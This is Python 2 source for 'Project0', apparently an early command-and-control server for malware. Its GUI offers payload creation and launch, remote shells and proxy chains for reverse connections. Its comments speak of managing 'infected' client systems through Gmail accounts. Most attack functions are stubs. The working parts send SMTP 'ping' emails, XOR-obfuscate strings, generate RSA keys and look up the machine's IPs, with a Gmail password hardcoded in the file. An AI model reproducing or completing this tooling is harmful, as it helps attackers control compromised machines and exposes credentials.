#! /usr/bin/python2

import PySimpleGUI27 as sg
import threading as th #may cause problems, but will be needed to check emails at the same time as
import time #timing the checkup so that a client isnt flooded with checkups
import sys
import os
import re
import glob
import pwd
import itertools
import smtplib
from requests import get
from Crypto.PublicKey import RSA
from Crypto import Random
import base64


external_ip = get('https://api.ipify.org').text

server_username = 't.0.e.0.s.0.t.0.u.0.s.0.e.0.r.0@gmail.com'
server_password = 'T3stUs3R*'
test_account_name = "transaction.failed.0@gmail.com"


currentDir = os.getcwd()


def populateAccounts(): #returns a dictionary of lists of accounts
  #example format returned: {0: ['account1@mail.com', 'password1'], 1: ['account2@mail.com', 'password2'], 2: ['account3@mail.com', 'password3']}
  dirtyaccountList = open(currentDir + "/config/accountList", 'r+b').readlines()
  accounts= {}
  counter = 0
  for account in dirtyaccountList:
    accounts[counter] = account.strip().split(':')
    accounts[counter].append("unknown")
    counter = counter + 1
  return accounts
def populateClients():
  dirtyClientList = open(currentDir + "/config/clientList", 'r+b').readlines()
  clients = {}
  counter = 0
  for client in dirtyClientList:
    clients[counter] = client.strip().split(":")
    clients[counter].append("unknown")
    counter = counter + 1
  return clients
def findModules(): #populate a list of modules available to the server
  pass

accounts = populateAccounts()
clients = populateClients()


menu_def = [['&File', ['Edit Modules', 'Edit ProxyList', ]],
            ['&Edit', ['Config', ['Proxy', 'Module', ]]],
            ['&Help', '&About']]

mainLayout = [[sg.Menu(menu_def, tearoff=True)], [sg.Text("Account to send from:", size=(138, 1), justification="right")],
          [sg.Combo(["Create Payload", "Launch Payload", "Open shell", "Check Status of Clients",
                     "Check Status of ProxyChains","Single Account Checkup"], size=(100, 10), enable_events=False, readonly=True),
           sg.Listbox(values=(accounts.values()), size=(50, 20))],
          [sg.Button("Execute", size=(20, 2), button_color=["red", "black"])],
          [sg.Text("Notes", size=(120, 2)), sg.Text("Target Client", size=(15, 2))],
          [sg.Multiline(autoscroll=True, size=(100, 10), do_not_clear=True),
           sg.Listbox(values=(clients.values()), size=(50, 10))],
          [sg.Button("Save", tooltip='Click to save notes for client', button_color=["black", "white"]),
           sg.Button('Add Client', button_color=["black", "white"]),
           sg.Button('Add Module', button_color=["black", "white"]),
           sg.Button('Add Account', button_color=["black", "white"]),
           sg.Button("Clear", button_color=["black", "white"]), sg.Button('Exit', button_color=["black", "red"])]]

#Sample Layouts

#  column1 = [[sg.Text('Column 1', background_color='lightblue', justification='center', size=(10, 1))],
#           [sg.Spin(values=('Spin Box 1', '2', '3'), initial_value='Spin Box 1')],
#           [sg.Spin(values=('Spin Box 1', '2', '3'), initial_value='Spin Box 2')],
#           [sg.Spin(values=('Spin Box 1', '2', '3'), initial_value='Spin Box 3')]]

#  layout = layout = [
#    [sg.Menu(menu_def, tearoff=True)],
#    [sg.Text('(Almost) All widgets in one Window!', size=(30, 1), justification='center', font=("Helvetica", 25), relief=sg.RELIEF_RIDGE)],
#    [sg.Text('Here is some text.... and a place to enter text')],
#    [sg.InputText('This is my text')],
#    [sg.Frame(layout=[
#    [sg.Checkbox('Checkbox', size=(10,1)),  sg.Checkbox('My second checkbox!', default=True)],
#    [sg.Radio('My first Radio!     ', "RADIO1", default=True, size=(10,1)), sg.Radio('My second Radio!', "RADIO1")]], title='Options',title_color='red', relief=sg.RELIEF_SUNKEN, tooltip='Use these to set flags')],
#    [sg.Multiline(default_text='This is the default Text should you decide not to type anything', size=(35, 3)),
#     sg.Multiline(default_text='A second multi-line', size=(35, 3))],
#    [sg.InputCombo(('Combobox 1', 'Combobox 2'), size=(20, 1)),
#     sg.Slider(range=(1, 100), orientation='h', size=(34, 20), default_value=85)],
#    [sg.InputOptionMenu(('Menu Option 1', 'Menu Option 2', 'Menu Option 3'))],
#    [sg.Listbox(values=('Listbox 1', 'Listbox 2', 'Listbox 3'), size=(30, 3)),
#     sg.Frame('Labelled Group',[[
#     sg.Slider(range=(1, 100), orientation='v', size=(5, 20), default_value=25, tick_interval=25),
#     sg.Slider(range=(1, 100), orientation='v', size=(5, 20), default_value=75),
#     sg.Slider(range=(1, 100), orientation='v', size=(5, 20), default_value=10),
#     sg.Column(column1, background_color='lightblue')]])],
#    [sg.Text('_' * 80)],
#    [sg.Text('Choose A Folder', size=(35, 1))],
#    [sg.Text('Your Folder', size=(15, 1), auto_size_text=False, justification='right'),
#     sg.InputText('Default Folder'), sg.FolderBrowse()],
#    [sg.Submit(tooltip='Click to submit this form'), sg.Cancel()]]

def startup():
  layout = [[sg.Text('Please enter the name of your server:')],[sg.InputText()],[sg.Submit(), sg.Cancel()]]
  window = sg.Window('Project0', layout)
  event, values = window.Read()
  window.Close()
  ServerName = values[0]
  return ServerName

def main(ServerName): #main window layout for managing clients
  window = sg.Window(ServerName, mainLayout)
  exit = 0
  while not exit:
    window = sg.Window(ServerName, mainLayout)
    if not parseWindow(window):
      exit = 1
    window.Close()
    pass
  window.Close()
  pass

def parseWindow(window): #parses all buttons,checkboxes, etc. for the selected window
  event, values = window.Read()
  event, values = window.Read()
  if event is None or event == "Exit":
      return 0
  elif event == "Open Config":
    fileName = openFileBox()
    os.system("gnome-terminal -e nano " + fileName)
    return 1
  elif event == "Add Account":
    addAccount()
    return 1
  elif event == "Add Client":
    addClient()
    return 1
  elif event == "Add Module":
    addModule()
    return 1
  elif event == "About":
    help = open(currentDir + "/../../README.md", "r").read()
    sg.PopupScrolled(help)
    return 1
  else:
    print event, values
  
  if event == "Execute":
    if values[1] == "Checkup":
      fullCheckup()
      return 1
    elif values[1] == "Single Account Checkup":
      layoutSingleAccountCheckup = [[sg.Listbox(values=(accounts.values()), size=(50, 20))],
                             [sg.Button("OK")]]
      windowSingleAccountCheckup = sg.Window("Check on which account?", layoutSingleAccountCheckup)
      eventSC, valuesSC = windowSingleAccountCheckup.Read()
      #print valuesSC
      #print valuesSC[0][0][0]
      #print valuesSC[0][0][1]
      singleAccount(valuesSC[0][0][0],valuesSC[0][0][1])
    else:
      print(event, values)
  return 1

def createConfig(): #create a config to bundle into payload to be loaded by the client
  pass
def launchPayload(): #send the obfuscated and encrypted command payload, module, or config update to the client
  pass
def createPayload(): #create a command payload to be saved somewhere
  pass
def status(): #keeps a live running update of whether the client is live or dead
  pass
def fullCheckup(): #module used to essentially "ping" the client to check if it is alive or dead
  
  pass
def singleCheckup(): #check whether a single client is alive
  pass
def fullAccount():
  for each_account in accounts:
    mailSender(each_account[1],server_username,server_password, "IsLive?",'','')
  
  pass
def singleAccount(accountName, accountPass): #Checks whether the account being sent to is alive or dead, by sending a "ping" from the account back to the server recieving account
  mailSender(test_account_name, accountName, accountPass, "Test",'','')
  pass
def readUpdate(): #client will send periodic updates of the infected system, this keeps track of it
  pass
def addModule(): #add module to the Project0 framework
  print openFileBox()
  pass
def editModule(): #open a text editor to modify the selected module
  pass
def makeProxyList(): #generate a proxy list for client to reverse connect through
  pass
def updateProxy(): #send the selected proxy list to the client
  pass
def addClient():
  layout = [[sg.Text('Please enter the IP address and email')],[sg.Text('IP Address:', size=(15, 1)), sg.InputText('', key='_IP_')],[sg.Text('Email:', size=(15, 1)), sg.InputText('', key='_EMAIL_')],[sg.Submit(), sg.Cancel()]]
  window = sg.Window('Add Account', layout)
  event, values = window.Read()
  window.Close()
  if (sg.PopupYesNo("Are you sure?") == "Yes"):
    return values
  else:
    pass

def addAccount(): #add email account to the "Available" section
  layout = [[sg.Text('Please enter the email address and password')],[sg.Text('Email Address:', size=(15, 1)), sg.InputText('', key='_EMAIL_')],[sg.Text('Password:', size=(15, 1)), sg.InputText('', key='_PASSWORD_')],[sg.Submit(), sg.Cancel()]]
  window = sg.Window('Add Account', layout)
  event, values = window.Read()
  window.Close()
  if (sg.PopupYesNo("Are you sure?") == "Yes"):
    return values
  else:
    pass
def readAll(): #read all emails within an account
  pass
def processEmail(accountUser): #makes sure the address is valid, if not red out in the select account list
  if not re.match("[^@]+@[^@]+\.[^@]+",accountUser):
    return "Invalid"
  else:
    return "Valid"
  pass

def openFileBox():
  layout = [[sg.T('Source Folder')],
              [sg.In()],
              [sg.FileBrowse(target=(-1, 0)), sg.OK()]]
  window = sg.Window("Choose File", layout)
  event, values = window.Read()
  if event == "OK":
    return values
  else:
    return 0
def popUpError(ErrorMessage):
  sg.PopupError('PopupError')
  pass
def mailSender(reUser, seUser,sePass,subject,text,filenames): #the actual sending of the email is handled here, fragmenting and obfuscation done elsewhere
  email_text = """\
From: %s
To: %s
Subject: %s

%s
""" % (seUser, reUser, subject, text)

  server = smtplib.SMTP('smtp.gmail.com', 587)
  server.ehlo()
  server.starttls()

  server.login(seUser, sePass)
  server.sendmail(seUser, reUser, email_text)
def reMailChecker(accountName, accountPass, serverName): #returns all recent emails received by the account from the main server
  pass

def encrypt(inString,sequenceNum):
  interim = []
  output = []
  inputArray = list(inString)
  inputArray.insert(0,str(len(inString)))
  for eachChar in inputArray:
    interim.append((ord(eachChar)))
  for eachAscii in interim:
    output.append(str(eachAscii^sequenceNum)+'X')
    print eachAscii^sequenceNum
  output.append(str(sequenceNum)+'S')
  return ''.join(output[::-1])

def decrypt(inString):
  sequenceNum = inString.split('S')[0]
  print sequenceNum
  interimArray = []
  formattedArray = inString.split('S').pop(1).split('X')
  del formattedArray[-1]
  for eachAscii in formattedArray:
     interimArray.append(chr(int(eachAscii)^int(sequenceNum)))
  return ''.join(interimArray[::-1])[1:]

def encode(filepath):
  file = open(filepath, "rb").read()
  encoded = base64.b64encode(file)
  return encoded

def decode(filepath):
   file = open(filepath, "rb").read()
   decoded = base64.b64decode(file)
   return decoded
def createKey():
  random_generator = Random.new().read
  key = RSA.generate(1024, random_generator)
  return key.export()
  pass
def storeKey(key, path): #store a single key into a user selected file, key must be text, not an object
  f = open(path, "w+")
  f.write(key)
  pass
def storeAllKeys(keyList, path): #store every key for every client into a user selected file, keyList[0] is the client number, keylist[1] is the key
  f = open(path, "a")
  for key in keyList:
    f.write(keyList[0] + ":::" + keyList[1])
  pass
def revertKey(clientNum, keyList, oldKeyList): #revert to another key for the selected client
  pass
def revertAllKeys(keyList, oldKeyList): #revert from a full backup in case you fucked up and generated new keys
  pass
def newKeys(): #send out the new public key(s) to every live host, any updates using old keys will be lost, unless we
  #use a backup of the keys to a file every time the server closes, on a crash they would be lost
  pass
def getIPs(): #returns a tuple, The users current external IP followed by the internal
  raw_ips = []

  raw_ips.append(get('https://api.ipify.org').text)
  data = os.popen("ip addr").readlines()
  for ip in data:
    if ip[:9] == "    inet " and ip[9:12] != "127":
      raw_ip = ip[9:]
      break
  raw_ip = raw_ip.split(' ')
  raw_ip = raw_ip[0]
  raw_ips.append(raw_ip[:len(raw_ip)-3])

  ips = []

  for ip in raw_ips:
    ips.append(ip.encode('ascii', 'ignore'))
  return ips


print getIPs()
#print processEmail('transaction.failed.0@gmail.com')
#main(startup())
#addAccount()
#openFileBox()
